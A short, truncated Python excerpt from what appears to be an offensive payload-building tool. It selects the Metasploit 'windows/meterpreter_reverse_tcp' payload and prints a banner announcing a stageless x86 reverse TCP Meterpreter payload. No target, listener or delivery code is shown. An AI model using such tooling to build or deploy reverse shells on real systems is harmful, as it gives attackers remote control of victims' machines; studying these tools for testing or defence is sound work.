...
def Construction():
    ...
    RC_PAYLOAD = "windows/meterpreter_reverse_tcp"
    
    print(core.amcolors.PURPLE + core.amcolors.BOLD + "[STAGELESS] Payload x86 Meterpreter Reverse TCP" + core.amcolors.ENDC)
